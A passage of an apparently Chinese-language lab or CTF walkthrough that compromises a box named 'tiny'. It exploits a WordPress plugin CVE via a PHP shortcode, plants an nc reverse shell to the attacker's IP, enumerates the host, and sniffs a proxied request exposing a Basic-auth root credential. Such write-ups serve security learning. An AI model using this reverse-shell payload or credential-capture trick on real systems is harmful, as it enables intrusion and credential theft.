<p>有两个插件 akismet和thesis-openhook<br>akismet有个cve <code>CVE-2015-9357</code> thesis-openhook有个cve <code>CVE-2023-5201</code><br>由于该版本wp较新 我使用thesis-openhook 的CVE<br><img src="https://ooo.0x0.ooo/2024/04/21/Opk2gx.png" alt="Opk2gx.png" loading="lazy"><br>只要在文章插入php短代码即可<br><img src="https://ooo.0x0.ooo/2024/04/21/Opk6sj.png" alt="Opk6sj.png" loading="lazy"><br>发现成功执行<br><img src="https://ooo.0x0.ooo/2024/04/21/OpkXop.png" alt="OpkXop.png" loading="lazy"><br>然后弹个shell</p>
<blockquote>
<p>[php]<br><?php system('nc -e /bin/bash 192.168.56.104 4567');?><br>[&#x2F;php]</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567              </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.157<span class="token punctuation">]</span> <span class="token number">60574</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<p>升级一下shell<br><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><p>端口扫描的时候出现的8888端口还没利用，看一下网络情况和进程</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ ss <span class="token parameter variable">-tulnp</span>
ss <span class="token parameter variable">-tulnp</span>
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN <span class="token number">0</span>      <span class="token number">0</span>            <span class="token number">0.0</span>.0.0:68        <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">511</span>        <span class="token number">127.0</span>.0.1:8000      <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">80</span>         <span class="token number">127.0</span>.0.1:3306      <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">128</span>          <span class="token number">0.0</span>.0.0:22        <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">1024</span>         <span class="token number">0.0</span>.0.0:8888      <span class="token number">0.0</span>.0.0:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">511</span>                *:80              *:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">128</span>             <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*          
tcp   LISTEN <span class="token number">0</span>      <span class="token number">1024</span>            <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:8888         <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*  </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ <span class="token function">ps</span> aux
<span class="token function">ps</span> aux
<span class="token environment constant">USER</span>         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           <span class="token number">1</span>  <span class="token number">0.0</span>  <span class="token number">0.4</span> <span class="token number">101960</span> <span class="token number">12068</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:01 /sbin/init
root           <span class="token number">2</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>
root           <span class="token number">3</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_gp<span class="token punctuation">]</span>
root           <span class="token number">4</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_par_gp<span class="token punctuation">]</span>
root           <span class="token number">5</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>slub_flushwq
root           <span class="token number">6</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>netns<span class="token punctuation">]</span>
root           <span class="token number">8</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/0:0H
root          <span class="token number">10</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>mm_percpu_wq
root          <span class="token number">11</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_tasks_kt
root          <span class="token number">12</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_tasks_ru
root          <span class="token number">13</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_tasks_tr
root          <span class="token number">14</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:08 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>
root          <span class="token number">15</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>rcu_preempt<span class="token punctuation">]</span>
root          <span class="token number">16</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>migration/0<span class="token punctuation">]</span>
root          <span class="token number">18</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>cpuhp/0<span class="token punctuation">]</span>
root          <span class="token number">20</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kdevtmpfs<span class="token punctuation">]</span>
root          <span class="token number">21</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>inet_frag_wq
root          <span class="token number">22</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kauditd<span class="token punctuation">]</span>
root          <span class="token number">23</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>khungtaskd<span class="token punctuation">]</span>
root          <span class="token number">25</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>oom_reaper<span class="token punctuation">]</span>
root          <span class="token number">26</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>writeback<span class="token punctuation">]</span>
root          <span class="token number">28</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kcompactd0<span class="token punctuation">]</span>
root          <span class="token number">29</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        SN   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ksmd<span class="token punctuation">]</span>
root          <span class="token number">30</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        SN   <span class="token number">17</span>:06   <span class="token number">0</span>:01 <span class="token punctuation">[</span>khugepaged<span class="token punctuation">]</span>
root          <span class="token number">31</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kintegrityd<span class="token punctuation">]</span>
root          <span class="token number">32</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kblockd<span class="token punctuation">]</span>
root          <span class="token number">33</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>blkcg_punt_b
root          <span class="token number">34</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>tpm_dev_wq<span class="token punctuation">]</span>
root          <span class="token number">35</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>edac-poller<span class="token punctuation">]</span>
root          <span class="token number">36</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>devfreq_wq<span class="token punctuation">]</span>
root          <span class="token number">38</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kswapd0<span class="token punctuation">]</span>
root          <span class="token number">44</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kthrotld<span class="token punctuation">]</span>
root          <span class="token number">46</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>acpi_thermal
root          <span class="token number">47</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>xenbus_probe
root          <span class="token number">48</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>mld<span class="token punctuation">]</span>
root          <span class="token number">49</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ipv6_addrcon
root          <span class="token number">54</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kstrp<span class="token punctuation">]</span>
root          <span class="token number">59</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>zswap-shrink
root          <span class="token number">60</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u3:0
root         <span class="token number">128</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ata_sff<span class="token punctuation">]</span>
root         <span class="token number">129</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_eh_0<span class="token punctuation">]</span>
root         <span class="token number">130</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_tmf_0<span class="token punctuation">]</span>
root         <span class="token number">131</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_eh_1<span class="token punctuation">]</span>
root         <span class="token number">132</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_tmf_1<span class="token punctuation">]</span>
root         <span class="token number">133</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_eh_2<span class="token punctuation">]</span>
root         <span class="token number">134</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>scsi_tmf_2<span class="token punctuation">]</span>
root         <span class="token number">142</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:01 <span class="token punctuation">[</span>kworker/0:2H
root         <span class="token number">173</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>jbd2/sda1-8<span class="token punctuation">]</span>
root         <span class="token number">174</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>ext4-rsv-con
root         <span class="token number">219</span>  <span class="token number">0.0</span>  <span class="token number">0.4</span>  <span class="token number">33036</span> <span class="token number">12480</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
root         <span class="token number">245</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">25464</span>  <span class="token number">6200</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
systemd+     <span class="token number">252</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">90040</span>  <span class="token number">6636</span> ?        Ssl  <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
root         <span class="token number">304</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I<span class="token operator">&lt;</span>   <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>cryptd<span class="token punctuation">]</span>
root         <span class="token number">337</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 <span class="token punctuation">[</span>irq/18-vmwgf
root         <span class="token number">402</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">5868</span>  <span class="token number">3696</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 dhclient <span class="token parameter variable">-4</span> -
root         <span class="token number">493</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">6608</span>  <span class="token number">2696</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /usr/sbin/cro
message+     <span class="token number">494</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">9116</span>  <span class="token number">4828</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /usr/bin/dbus
root         <span class="token number">496</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">24836</span>  <span class="token number">7764</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /lib/systemd/
root         <span class="token number">513</span>  <span class="token number">0.0</span>  <span class="token number">0.2</span>  <span class="token number">16508</span>  <span class="token number">5844</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /sbin/wpa_sup
tinypro+     <span class="token number">520</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span> <span class="token number">531124</span>  <span class="token number">3996</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 /usr/bin/tiny
root         <span class="token number">525</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">5872</span>  <span class="token number">1032</span> tty1     Ss+  <span class="token number">17</span>:06   <span class="token number">0</span>:00 /sbin/agetty 
root         <span class="token number">544</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>  <span class="token number">10344</span>   <span class="token number">976</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 nginx: master
root         <span class="token number">546</span>  <span class="token number">0.0</span>  <span class="token number">0.3</span>  <span class="token number">15400</span>  <span class="token number">9300</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:00 sshd: /usr/sb
root         <span class="token number">547</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>  <span class="token number">11940</span>  <span class="token number">3780</span> ?        S    <span class="token number">17</span>:06   <span class="token number">0</span>:00 nginx: worker
root         <span class="token number">591</span>  <span class="token number">0.0</span>  <span class="token number">1.0</span> <span class="token number">253640</span> <span class="token number">28636</span> ?        Ss   <span class="token number">17</span>:06   <span class="token number">0</span>:01 /usr/sbin/apa
mysql        <span class="token number">603</span>  <span class="token number">0.0</span>  <span class="token number">8.8</span> <span class="token number">1081328</span> <span class="token number">247912</span> ?      Ssl  <span class="token number">17</span>:06   <span class="token number">0</span>:05 /usr/sbin/mar
www-data    <span class="token number">2041</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">257320</span> <span class="token number">43384</span> ?        S    <span class="token number">18</span>:41   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2057</span>  <span class="token number">0.0</span>  <span class="token number">1.7</span> <span class="token number">257820</span> <span class="token number">49616</span> ?        S    <span class="token number">18</span>:41   <span class="token number">0</span>:02 /usr/sbin/apa
www-data    <span class="token number">2081</span>  <span class="token number">0.0</span>  <span class="token number">1.7</span> <span class="token number">257916</span> <span class="token number">49096</span> ?        S    <span class="token number">18</span>:42   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2115</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">257268</span> <span class="token number">43316</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2128</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">257164</span> <span class="token number">44580</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2131</span>  <span class="token number">0.0</span>  <span class="token number">1.6</span> <span class="token number">257200</span> <span class="token number">45016</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:01 /usr/sbin/apa
www-data    <span class="token number">2134</span>  <span class="token number">0.0</span>  <span class="token number">1.6</span> <span class="token number">257576</span> <span class="token number">47324</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2165</span>  <span class="token number">0.0</span>  <span class="token number">1.6</span> <span class="token number">257560</span> <span class="token number">47032</span> ?        S    <span class="token number">18</span>:44   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2256</span>  <span class="token number">0.0</span>  <span class="token number">1.8</span> <span class="token number">259976</span> <span class="token number">51244</span> ?        S    <span class="token number">18</span>:55   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2306</span>  <span class="token number">0.0</span>  <span class="token number">1.5</span> <span class="token number">255092</span> <span class="token number">42344</span> ?        S    <span class="token number">19</span>:01   <span class="token number">0</span>:00 /usr/sbin/apa
www-data    <span class="token number">2335</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2576</span>   <span class="token number">884</span> ?        S    <span class="token number">19</span>:04   <span class="token number">0</span>:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">nc</span> <span class="token parameter variable">-e</span> /
www-data    <span class="token number">2336</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">3924</span>  <span class="token number">2944</span> ?        S    <span class="token number">19</span>:04   <span class="token number">0</span>:00 <span class="token function">bash</span>
www-data    <span class="token number">2355</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2516</span>  <span class="token number">1020</span> ?        S    <span class="token number">19</span>:04   <span class="token number">0</span>:00 /usr/bin/scri
www-data    <span class="token number">2356</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2576</span>   <span class="token number">896</span> pts/0    Ss   <span class="token number">19</span>:04   <span class="token number">0</span>:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> /usr/bi
www-data    <span class="token number">2357</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">4188</span>  <span class="token number">3460</span> pts/0    S+   <span class="token number">19</span>:04   <span class="token number">0</span>:00 /usr/bin/bash
www-data    <span class="token number">2578</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">2576</span>   <span class="token number">912</span> ?        S    <span class="token number">19</span>:11   <span class="token number">0</span>:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">nc</span> <span class="token parameter variable">-e</span> /
www-data    <span class="token number">2579</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">3924</span>  <span class="token number">2924</span> ?        S    <span class="token number">19</span>:11   <span class="token number">0</span>:00 <span class="token function">bash</span>
www-data    <span class="token number">2589</span>  <span class="token number">0.0</span>  <span class="token number">0.3</span>  <span class="token number">17056</span>  <span class="token number">9912</span> ?        S    <span class="token number">19</span>:12   <span class="token number">0</span>:00 python3 <span class="token parameter variable">-c</span> im
www-data    <span class="token number">2590</span>  <span class="token number">0.0</span>  <span class="token number">0.1</span>   <span class="token number">7544</span>  <span class="token number">3560</span> pts/1    Ss   <span class="token number">19</span>:12   <span class="token number">0</span>:00 /bin/bash
root        <span class="token number">2610</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:15   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:1
root        <span class="token number">2659</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:21   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:2
root        <span class="token number">2660</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:21   <span class="token number">0</span>:01 <span class="token punctuation">[</span>kworker/0:2-
root        <span class="token number">2770</span>  <span class="token number">0.1</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:37   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/0:0-
root        <span class="token number">2837</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:39   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:0
root        <span class="token number">2858</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:42   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/0:1-
root        <span class="token number">2870</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>      <span class="token number">0</span>     <span class="token number">0</span> ?        I    <span class="token number">19</span>:44   <span class="token number">0</span>:00 <span class="token punctuation">[</span>kworker/u2:3
www-data    <span class="token number">2895</span>  <span class="token number">100</span>  <span class="token number">0.1</span>  <span class="token number">11456</span>  <span class="token number">4196</span> pts/1    R+   <span class="token number">19</span>:46   <span class="token number">0</span>:00 <span class="token function">ps</span> aux</code></pre>
<p><strong>tinypro+     520  0.0  0.1 531124  3996 ?        Ss   17:06   0:00 &#x2F;usr&#x2F;bin&#x2F;tiny</strong><br>可以看到了开了一个tinypro服务<br>看一下配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ <span class="token function">cat</span> /etc/tinyproxy/tinyproxy.conf
<span class="token function">cat</span> /etc/tinyproxy/tinyproxy.conf
User tinyproxy
Group tinyproxy
Port <span class="token number">8888</span>
Timeout <span class="token number">600</span>
DefaultErrorFile <span class="token string">"/usr/share/tinyproxy/default.html"</span>
StatFile <span class="token string">"/usr/share/tinyproxy/stats.html"</span>
LogFile <span class="token string">"/var/log/tinyproxy/tinyproxy.log"</span>
LogLevel Info
PidFile <span class="token string">"/run/tinyproxy/tinyproxy.pid"</span>
Upstream http localhost:1111
MaxClients <span class="token number">100</span>
Allow <span class="token number">127.0</span>.0.1
Allow ::1
Allow <span class="token number">192.168</span>.0.30
ViaProxyName <span class="token string">"tinyproxy"</span></code></pre>
<p>根据配置可以看到流量会被转发到1111端口，监听一下1111端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@tiny:/var/www/html/wp-admin$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1111</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1111</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">1111</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">127.0</span>.0.1<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">127.0</span>.0.1<span class="token punctuation">]</span> <span class="token number">60076</span>
GET http://127.0.0.1:8000/id_rsa HTTP/1.1
Host: <span class="token number">127.0</span>.0.1:8000
Connection: close
Via: <span class="token number">1.1</span> tinyproxy <span class="token punctuation">(</span>tinyproxy/1.11.1<span class="token punctuation">)</span>
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz
User-Agent: curl/7.88.1
Accept: */*</code></pre>
